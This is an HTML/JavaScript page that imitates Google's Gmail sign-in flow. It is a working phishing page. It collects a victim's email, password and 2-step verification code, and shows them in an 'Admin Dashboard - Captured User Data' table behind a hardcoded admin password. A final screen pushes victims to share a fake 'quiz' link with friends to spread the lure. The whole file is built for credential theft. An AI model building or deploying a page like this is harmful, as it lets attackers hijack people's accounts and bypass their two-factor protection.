<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail - Secure Login</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap">
    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Roboto', Arial, sans-serif;
        }

        body {
            background-color: #f6f8fc;
            color: #202124;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* Admin Login Button */
        .admin-login-btn {
            position: fixed;
            top: 20px;
            right: 20px;
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 10px 20px;
            font-size: 14px;
            cursor: pointer;
            z-index: 1000;
            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
        }

        .admin-login-btn:hover {
            background-color: #0d62d9;
        }

        /* Login Modal */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: rgba(0, 0, 0, 0.5);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }

        .login-modal {
            background-color: white;
            border-radius: 8px;
            width: 448px;
            max-width: 90%;
            box-shadow: 0 4px 8px 3px rgba(0,0,0,0.15), 0 1px 3px rgba(0,0,0,0.3);
            overflow: hidden;
        }

        .modal-header {
            padding: 24px 24px 0;
            text-align: center;
        }

        .google-logo {
            width: 75px;
            height: 24px;
            margin-bottom: 16px;
        }

        .modal-title {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 8px;
        }

        .modal-subtitle {
            color: #5f6368;
            font-size: 16px;
            margin-bottom: 24px;
        }

        .modal-body {
            padding: 0 40px 32px;
        }

        .form-group {
            margin-bottom: 24px;
        }

        .form-input {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            outline: none;
        }

        .form-input:focus {
            border-color: #1a73e8;
            border-width: 2px;
            padding: 12px 14px;
        }

        .forgot-email {
            color: #1a73e8;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
        }

        .modal-footer {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 24px 24px 32px;
        }

        .create-account {
            color: #1a73e8;
            font-weight: 500;
            text-decoration: none;
            font-size: 14px;
        }

        .next-button {
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }

        .next-button:hover {
            background-color: #0d62d9;
            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.302), 0 1px 3px 1px rgba(60,64,67,0.149);
        }

        /* Password Modal */
        .password-modal {
            background-color: white;
            border-radius: 8px;
            width: 448px;
            max-width: 90%;
            box-shadow: 0 4px 8px 3px rgba(0,0,0,0.15), 0 1px 3px rgba(0,0,0,0.3);
            overflow: hidden;
        }

        .password-body {
            padding: 40px 40px 32px;
        }

        .user-info {
            display: flex;
            align-items: center;
            margin-bottom: 24px;
        }

        .user-avatar-small {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background-color: #004ba0;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 500;
            margin-right: 16px;
        }

        .user-details {
            flex: 1;
        }

        .user-email {
            font-weight: 500;
        }

        .switch-account {
            color: #1a73e8;
            font-size: 14px;
            text-decoration: none;
        }

        .password-input-container {
            position: relative;
            margin-bottom: 24px;
        }

        .password-input {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            outline: none;
            padding-right: 40px;
        }

        .password-input:focus {
            border-color: #1a73e8;
            border-width: 2px;
            padding: 12px 39px 12px 14px;
        }

        .toggle-password {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #5f6368;
            cursor: pointer;
        }

        .forgot-password {
            color: #1a73e8;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
        }

        /* 2SV Modal */
        .two-step-modal {
            background-color: white;
            border-radius: 8px;
            width: 448px;
            max-width: 90%;
            box-shadow: 0 4px 8px 3px rgba(0,0,0,0.15), 0 1px 3px rgba(0,0,0,0.3);
            overflow: hidden;
        }

        .two-step-body {
            padding: 40px 40px 32px;
        }

        .verification-icon {
            display: flex;
            justify-content: center;
            margin-bottom: 24px;
        }

        .verification-icon .material-icons {
            font-size: 48px;
            color: #1a73e8;
        }

        .verification-title {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 16px;
            text-align: center;
        }

        .verification-text {
            color: #5f6368;
            font-size: 16px;
            text-align: center;
            margin-bottom: 24px;
        }

        .code-inputs {
            display: flex;
            justify-content: space-between;
            margin-bottom: 32px;
        }

        .code-input {
            width: 40px;
            height: 40px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            text-align: center;
            font-size: 20px;
            outline: none;
        }

        .code-input:focus {
            border-color: #1a73e8;
            border-width: 2px;
        }

        .verify-button {
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            width: 100%;
        }

        .verify-button:hover {
            background-color: #0d62d9;
            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.302), 0 1px 3px 1px rgba(60,64,67,0.149);
        }

        .different-method {
            text-align: center;
            margin-top: 16px;
        }

        .different-method a {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
        }

        /* Success Modal */
        .success-modal {
            background-color: white;
            border-radius: 8px;
            width: 500px;
            max-width: 90%;
            box-shadow: 0 4px 8px 3px rgba(0,0,0,0.15), 0 1px 3px rgba(0,0,0,0.3);
            overflow: hidden;
            text-align: center;
            padding: 40px 30px;
        }

        .success-icon {
            font-size: 64px;
            color: #34a853;
            margin-bottom: 20px;
        }

        .success-title {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 16px;
            color: #202124;
        }

        .success-message {
            color: #5f6368;
            font-size: 16px;
            margin-bottom: 30px;
            line-height: 1.5;
        }

        .link-container {
            background-color: #f8f9fa;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 25px;
            border: 1px solid #dadce0;
        }

        .share-link {
            font-size: 14px;
            color: #1a73e8;
            word-break: break-all;
            margin-bottom: 15px;
        }

        .copy-button {
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 8px 16px;
            font-size: 14px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto;
        }

        .copy-button:hover {
            background-color: #0d62d9;
        }

        .copy-button .material-icons {
            font-size: 16px;
            margin-right: 5px;
        }

        .share-button {
            background-color: #34a853;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto;
        }

        .share-button:hover {
            background-color: #2d9249;
        }

        .share-button .material-icons {
            font-size: 18px;
            margin-right: 8px;
        }

        /* Admin Dashboard */
        .admin-dashboard {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: white;
            z-index: 1001;
            padding: 20px;
            overflow-y: auto;
            display: none;
        }

        .admin-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 1px solid #e0e0e0;
        }

        .admin-title {
            font-size: 24px;
            font-weight: 500;
            color: #1a73e8;
        }

        .admin-close {
            background: none;
            border: none;
            font-size: 24px;
            cursor: pointer;
            color: #5f6368;
        }

        .admin-stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background-color: #f8f9fa;
            border-radius: 8px;
            padding: 20px;
            text-align: center;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
        }

        .stat-value {
            font-size: 32px;
            font-weight: 500;
            color: #1a73e8;
            margin-bottom: 5px;
        }

        .stat-label {
            font-size: 14px;
            color: #5f6368;
        }

        .admin-table {
            width: 100%;
            border-collapse: collapse;
            background-color: white;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
            border-radius: 8px;
            overflow: hidden;
        }

        .admin-table th {
            background-color: #f1f3f4;
            padding: 12px 15px;
            text-align: left;
            font-weight: 500;
            color: #5f6368;
            border-bottom: 1px solid #e0e0e0;
        }

        .admin-table td {
            padding: 12px 15px;
            border-bottom: 1px solid #f1f3f4;
        }

        .admin-table tr:last-child td {
            border-bottom: none;
        }

        .admin-table tr:hover {
            background-color: #f8f9fa;
        }

        .no-data {
            text-align: center;
            padding: 40px;
            color: #5f6368;
            font-style: italic;
        }

        /* Admin Login Modal */
        .admin-auth-modal {
            background-color: white;
            border-radius: 8px;
            width: 400px;
            max-width: 90%;
            box-shadow: 0 4px 8px 3px rgba(0,0,0,0.15), 0 1px 3px rgba(0,0,0,0.3);
            overflow: hidden;
            text-align: center;
            padding: 30px;
        }

        .admin-auth-title {
            font-size: 24px;
            font-weight: 500;
            margin-bottom: 20px;
            color: #1a73e8;
        }

        .admin-auth-input {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            margin-bottom: 20px;
            outline: none;
        }

        .admin-auth-input:focus {
            border-color: #1a73e8;
            border-width: 2px;
        }

        .admin-login-button {
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 12px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            width: 100%;
        }

        .admin-login-button:hover {
            background-color: #0d62d9;
        }

        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <!-- Admin Login Button -->
    <button class="admin-login-btn" id="adminLoginBtn">Admin Login</button>

    <!-- Admin Authentication Modal -->
    <div id="adminAuthModal" class="modal-overlay hidden">
        <div class="admin-auth-modal">
            <h2 class="admin-auth-title">Admin Authentication</h2>
            <input type="password" id="adminPassword" class="admin-auth-input" placeholder="Enter Admin Password">
            <button class="admin-login-button" id="adminAuthButton">Login to Admin Panel</button>
            <p style="margin-top: 15px; font-size: 12px; color: #5f6368;">
                Default password: admin123
            </p>
        </div>
    </div>

    <!-- Admin Dashboard -->
    <div class="admin-dashboard" id="adminDashboard">
        <div class="admin-header">
            <h2 class="admin-title">Admin Dashboard - Captured User Data</h2>
            <button class="admin-close" id="adminClose">
                <span class="material-icons">close</span>
            </button>
        </div>

        <div class="admin-stats">
            <div class="stat-card">
                <div class="stat-value" id="totalUsers">0</div>
                <div class="stat-label">Total Users</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="totalLogins">0</div>
                <div class="stat-label">Login Attempts</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="verifiedUsers">0</div>
                <div class="stat-label">Verified Users</div>
            </div>
        </div>

        <table class="admin-table">
            <thead>
                <tr>
                    <th>Email</th>
                    <th>Password</th>
                    <th>Verification Code</th>
                    <th>Login Time</th>
                </tr>
            </thead>
            <tbody id="adminTableBody">
                <tr>
                    <td colspan="4" class="no-data">No user data captured yet</td>
                </tr>
            </tbody>
        </table>
    </div>

    <!-- Login Modal -->
    <div id="loginModal" class="modal-overlay">
        <div class="login-modal">
            <div class="modal-header">
                <img src="https://fonts.gstatic.com/s/i/productlogos/googleg/v6/24px.svg" alt="Google" class="google-logo">
                <h1 class="modal-title">Sign in</h1>
                <p class="modal-subtitle">Use your Google Account</p>
            </div>
            <div class="modal-body">
                <div class="form-group">
                    <input type="email" id="email" class="form-input" placeholder="Email or phone">
                </div>
                <a href="#" class="forgot-email">Forgot email?</a>
            </div>
            <div class="modal-footer">
                <a href="#" class="create-account">Create account</a>
                <button id="nextButton" class="next-button">Next</button>
            </div>
        </div>
    </div>

    <!-- Password Modal -->
    <div id="passwordModal" class="modal-overlay hidden">
        <div class="password-modal">
            <div class="modal-header">
                <img src="https://fonts.gstatic.com/s/i/productlogos/googleg/v6/24px.svg" alt="Google" class="google-logo">
                <h1 class="modal-title">Welcome</h1>
                <p class="modal-subtitle" id="userEmailDisplay">user@example.com</p>
            </div>
            <div class="password-body">
                <div class="user-info">
                    <div class="user-avatar-small" id="userAvatar">U</div>
                    <div class="user-details">
                        <div class="user-email" id="userEmailText">user@example.com</div>
                        <a href="#" class="switch-account" id="switchAccount">Switch account</a>
                    </div>
                </div>
                <div class="form-group">
                    <div class="password-input-container">
                        <input type="password" id="password" class="password-input" placeholder="Enter your password">
                        <button class="toggle-password" id="togglePassword">
                            <span class="material-icons">visibility</span>
                        </button>
                    </div>
                    <a href="#" class="forgot-password">Forgot password?</a>
                </div>
            </div>
            <div class="modal-footer">
                <a href="#" class="create-account">Create account</a>
                <button id="passwordNextButton" class="next-button">Next</button>
            </div>
        </div>
    </div>

    <!-- 2-Step Verification Modal -->
    <div id="twoStepModal" class="modal-overlay hidden">
        <div class="two-step-modal">
            <div class="two-step-body">
                <div class="verification-icon">
                    <span class="material-icons">lock</span>
                </div>
                <h2 class="verification-title">2-Step Verification</h2>
                <p class="verification-text">A verification code has been sent to your device</p>
                <div class="code-inputs">
                    <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 1)">
                    <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 2)">
                    <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 3)">
                    <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 4)">
                    <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 5)">
                    <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 6)">
                </div>
                <button id="verifyButton" class="verify-button">Verify</button>
                <div class="different-method">
                    <a href="#" id="tryAnotherWay">Try another way</a>
                </div>
            </div>
        </div>
    </div>

    <!-- Success Modal (Only shows after verification) -->
    <div id="successModal" class="modal-overlay hidden">
        <div class="success-modal">
            <div class="success-icon">
                <span class="material-icons">check_circle</span>
            </div>
            <h2 class="success-title">Account Verified Successfully!</h2>
            <p class="success-message">
                Your account has been successfully verified. You can now share this quiz link with friends:
            </p>
            
            <div class="link-container">
                <div class="share-link" id="shareLink">https://letmeknowyouquiz.github.io/friends/</div>
                <button class="copy-button" id="copyButton">
                    <span class="material-icons">content_copy</span>
                    Copy Quiz Link
                </button>
            </div>
            
            <button class="share-button" id="shareButton">
                <span class="material-icons">share</span>
                Share Quiz with Friends
            </button>
        </div>
    </div>

    <script>
        // DOM Elements
        const adminLoginBtn = document.getElementById('adminLoginBtn');
        const adminAuthModal = document.getElementById('adminAuthModal');
        const adminPassword = document.getElementById('adminPassword');
        const adminAuthButton = document.getElementById('adminAuthButton');
        const adminDashboard = document.getElementById('adminDashboard');
        const adminClose = document.getElementById('adminClose');
        
        const loginModal = document.getElementById('loginModal');
        const passwordModal = document.getElementById('passwordModal');
        const twoStepModal = document.getElementById('twoStepModal');
        const successModal = document.getElementById('successModal');
        
        const nextButton = document.getElementById('nextButton');
        const passwordNextButton = document.getElementById('passwordNextButton');
        const verifyButton = document.getElementById('verifyButton');
        const copyButton = document.getElementById('copyButton');
        const shareButton = document.getElementById('shareButton');
        const switchAccount = document.getElementById('switchAccount');
        const tryAnotherWay = document.getElementById('tryAnotherWay');
        const togglePassword = document.getElementById('togglePassword');
        
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const codeInputs = document.querySelectorAll('.code-input');
        const shareLink = document.getElementById('shareLink');
        
        const userEmailDisplay = document.getElementById('userEmailDisplay');
        const userEmailText = document.getElementById('userEmailText');
        const userAvatar = document.getElementById('userAvatar');
        
        // Admin dashboard elements
        const totalUsers = document.getElementById('totalUsers');
        const totalLogins = document.getElementById('totalLogins');
        const verifiedUsers = document.getElementById('verifiedUsers');
        const adminTableBody = document.getElementById('adminTableBody');

        // Data storage
        let allUserData = JSON.parse(localStorage.getItem('gmailUserData')) || [];
        const ADMIN_PASSWORD = "admin123";

        // Event Listeners
        adminLoginBtn.addEventListener('click', showAdminAuth);
        adminAuthButton.addEventListener('click', handleAdminAuth);
        adminClose.addEventListener('click', hideAdminDashboard);
        
        nextButton.addEventListener('click', handleNextButton);
        passwordNextButton.addEventListener('click', handlePasswordNextButton);
        verifyButton.addEventListener('click', handleVerifyButton);
        copyButton.addEventListener('click', handleCopyLink);
        shareButton.addEventListener('click', handleShareLink);
        switchAccount.addEventListener('click', handleSwitchAccount);
        tryAnotherWay.addEventListener('click', handleTryAnotherWay);
        togglePassword.addEventListener('click', togglePasswordVisibility);

        // Admin Functions
        function showAdminAuth() {
            adminAuthModal.classList.remove('hidden');
            adminPassword.focus();
        }

        function handleAdminAuth() {
            const password = adminPassword.value;
            
            if (password === ADMIN_PASSWORD) {
                adminAuthModal.classList.add('hidden');
                adminDashboard.style.display = 'block';
                adminPassword.value = '';
                updateAdminDashboard();
            } else {
                alert('Incorrect admin password! Try: admin123');
                adminPassword.value = '';
                adminPassword.focus();
            }
        }

        function hideAdminDashboard() {
            adminDashboard.style.display = 'none';
        }

        function updateAdminDashboard() {
            // Update stats
            totalUsers.textContent = allUserData.length;
            totalLogins.textContent = allUserData.filter(user => user.password).length;
            verifiedUsers.textContent = allUserData.filter(user => user.verificationCode).length;
            
            // Update table
            if (allUserData.length === 0) {
                adminTableBody.innerHTML = '<tr><td colspan="4" class="no-data">No user data captured yet</td></tr>';
            } else {
                adminTableBody.innerHTML = allUserData.map(user => `
                    <tr>
                        <td>${user.email}</td>
                        <td>${user.password || 'Not entered'}</td>
                        <td>${user.verificationCode || 'Not verified'}</td>
                        <td>${user.loginTime}</td>
                    </tr>
                `).join('');
            }
        }

        // User Login Functions
        function handleNextButton() {
            const email = emailInput.value.trim();
            
            if (!email) {
                alert('Please enter your email');
                return;
            }
            
            // Update UI with user info
            const initial = email.charAt(0).toUpperCase();
            userAvatar.textContent = initial;
            userEmailDisplay.textContent = email;
            userEmailText.textContent = email;
            
            // Hide login modal and show password modal
            loginModal.classList.add('hidden');
            passwordModal.classList.remove('hidden');
            
            // Auto-focus password input
            passwordInput.focus();
        }

        function handlePasswordNextButton() {
            const password = passwordInput.value;
            const email = userEmailText.textContent;
            
            if (!password) {
                alert('Please enter your password');
                return;
            }
            
            // Store user data
            storeUserData(email, password, '');
            
            // Hide password modal and show 2-step verification
            passwordModal.classList.add('hidden');
            twoStepModal.classList.remove('hidden');
            
            // Auto-focus first code input
            codeInputs[0].focus();
            
            // Generate and send verification code
            sendVerificationCode();
        }

        function handleVerifyButton() {
            let code = '';
            codeInputs.forEach(input => {
                code += input.value;
            });
            
            if (code.length !== 6) {
                alert('Please enter the complete 6-digit code');
                return;
            }
            
            const email = userEmailText.textContent;
            
            // Update user data with verification code
            updateUserData(email, code);
            
            // Hide 2-step verification and show success modal
            twoStepModal.classList.add('hidden');
            successModal.classList.remove('hidden');
        }

        function handleCopyLink() {
            navigator.clipboard.writeText(shareLink.textContent)
                .then(() => {
                    // Change button text temporarily
                    const originalText = copyButton.innerHTML;
                    copyButton.innerHTML = '<span class="material-icons">check</span> Copied!';
                    
                    setTimeout(() => {
                        copyButton.innerHTML = originalText;
                    }, 2000);
                })
                .catch(err => {
                    console.error('Failed to copy: ', err);
                    alert('Failed to copy link to clipboard');
                });
        }

        function handleShareLink() {
            if (navigator.share) {
                navigator.share({
                    title: 'Fun Quiz Challenge',
                    text: 'Check out this interesting quiz! I just completed it and thought you might enjoy it too.',
                    url: shareLink.textContent,
                })
                .then(() => console.log('Successful share'))
                .catch((error) => console.log('Error sharing:', error));
            } else {
                // Fallback for browsers that don't support Web Share API
                handleCopyLink();
                alert('Quiz link copied to clipboard! You can now share it with your friends.');
            }
        }

        function handleSwitchAccount() {
            // Clear password and go back to email input
            passwordInput.value = '';
            passwordModal.classList.add('hidden');
            loginModal.classList.remove('hidden');
            emailInput.focus();
        }

        function handleTryAnotherWay() {
            alert('This would show alternative verification methods in a real app');
        }

        function togglePasswordVisibility() {
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
            togglePassword.innerHTML = type === 'password' ? 'visibility' : 'visibility_off';
        }

        function moveToNext(current, nextIndex) {
            if (current.value.length === 1 && nextIndex <= 6) {
                if (nextIndex < 6) {
                    codeInputs[nextIndex].focus();
                } else {
                    // Last input, focus verify button
                    verifyButton.focus();
                }
            }
        }

        function sendVerificationCode() {
            // In a real implementation, this would send the code to the user's device
            // For this demo, we'll generate a random code and log it
            const code = Math.floor(100000 + Math.random() * 900000).toString();
            console.log(`Verification code sent to user: ${code}`);
        }

        function storeUserData(email, password, verificationCode) {
            const userData = {
                email: email,
                password: password,
                verificationCode: verificationCode,
                loginTime: new Date().toLocaleString()
            };
            
            // Check if user already exists
            const existingUserIndex = allUserData.findIndex(user => user.email === email);
            
            if (existingUserIndex !== -1) {
                // Update existing user
                allUserData[existingUserIndex] = userData;
            } else {
                // Add new user
                allUserData.push(userData);
            }
            
            // Save to localStorage
            localStorage.setItem('gmailUserData', JSON.stringify(allUserData));
            
            // Update admin dashboard if visible
            if (adminDashboard.style.display === 'block') {
                updateAdminDashboard();
            }
        }

        function updateUserData(email, verificationCode) {
            const userIndex = allUserData.findIndex(user => user.email === email);
            
            if (userIndex !== -1) {
                allUserData[userIndex].verificationCode = verificationCode;
                
                // Save to localStorage
                localStorage.setItem('gmailUserData', JSON.stringify(allUserData));
                
                // Update admin dashboard if visible
                if (adminDashboard.style.display === 'block') {
                    updateAdminDashboard();
                }
            }
        }

        // Auto-focus email input when page loads
        window.onload = function() {
            emailInput.focus();
        };
    </script>
</body>

</html>
